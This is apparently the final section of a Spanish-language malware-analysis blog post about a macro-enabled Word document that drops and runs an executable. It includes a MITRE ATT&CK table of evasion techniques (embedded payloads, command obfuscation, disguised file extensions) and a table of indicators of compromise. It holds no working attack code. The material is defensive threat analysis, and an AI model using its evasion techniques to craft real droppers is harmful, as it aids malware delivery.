+<p>Aún así, el comportamiento que realiza el documento (crear una carpeta, extraer archivos, ejecutar un .exe) no es estándar para un documento normal, por lo que aún hay posibilidades de detección analizando lo que hace el archivo al ser ejecutado.</p>
+<p>Como parte de este análisis, pudimos identificar distintos indicadores de compromiso: archivos con un nombre estático, hashes de los distintos archivos comprimidos y ejecutables, así como carpetas creadas. Los IOC identificados se detallan en la sección 7.</p>
+<p>El payload malicioso corresponde a un agente que se comunica con un servidor de Comando y Control, en la segunda parte del post exploraremos cómo funciona el agente, las acciones que realiza y cómo podemos obtener posibles indicadores de compromiso de este.</p>
+<h2 id="6-mapeo-mitre-attck">
+  6. Mapeo MITRE ATT&amp;CK
+  <a href="#6-mapeo-mitre-attck" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Táctica</th>
+<th>Técnica</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1027.009</td>
+<td>Evasión de defensas</td>
+<td>Obfuscated Files or Information: Embedded Payloads</td>
+<td>Se embebieron payloads maliciosos dentro del documento</td>
+</tr>
+<tr>
+<td>T1027.010</td>
+<td>Evasión de defensas</td>
+<td>Obfuscated Files or Information: Command Obfuscation</td>
+<td>Se utilizó el reemplazo de caracteres para ofuscar comandos</td>
+</tr>
+<tr>
+<td>T1036.008</td>
+<td>Evasión de defensas</td>
+<td>Masquerade File Type</td>
+<td>Se cambió la extensión de los archivos ejecutables a .bin</td>
+</tr>
+<tr>
+<td>T1204.002</td>
+<td>Ejecución</td>
+<td>User Execution: Malicious File</td>
+<td>Requiere que el usuario ejecute un archivo malicioso</td>
+</tr>
+<tr>
+<td>T1059.005</td>
+<td>Ejecución</td>
+<td>Command and Scripting Interpreter: Visual Basic</td>
+<td>Se utilizó VBA para la ejecución de comandos</td>
+</tr>
+</tbody>
+</table>
+<h2 id="7-ioc">
+  7. IOC
+  <a href="#7-ioc" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>IOC</th>
+<th>Tipo</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22ce9042f6f78 202c6c346cef1b6e532</td>
+<td>Hash MD5</td>
+<td>.docm malicioso</td>
+</tr>
+<tr>
+<td>e31ac765d1e97 698bc1efe443325e497</td>
+<td>Hash MD5</td>
+<td>Comprimido malicioso (oleObject1.bin)</td>
+</tr>
+<tr>
+<td>59211a4e0f27d 70c659636746b61945a</td>
+<td>Hash MD5</td>
+<td>Payload malicioso 1</td>
+</tr>
+<tr>
+<td>1d493e326d91c 53e0f2f4320fb689d5f</td>
+<td>Hash MD5</td>
+<td>Payload malicioso 2</td>
+</tr>
+<tr>
+<td>efed06b2fd437 d6008a10d470e2c519f</td>
+<td>Hash MD5</td>
+<td>.docx falso (decoy)</td>
+</tr>
+<tr>
+<td>vteijam hdgtra.exe</td>
+<td>Nombre</td>
+<td>Ejecutable malicioso</td>
+</tr>
+<tr>
+<td>C:\users\[^\]+\Wrdix\d+$</td>
+<td>Ruta</td>
+<td>Ruta de archivo malicioso (C:\users\USUARIO\WrdixNUM)</td>
+</tr>
+</tbody>
+</table>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Leer otras publicaciones</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/es/posts/004-analyzing-a-dotnet-c2-agent/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">004 - Analizando un agente de C2 - Parte 2: el agente</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/es/posts/002-analyzing-a-malicious-macro/">
+                  <span class="button__text">002 - Analizando una macro maliciosa</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >The Malware Ninja</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
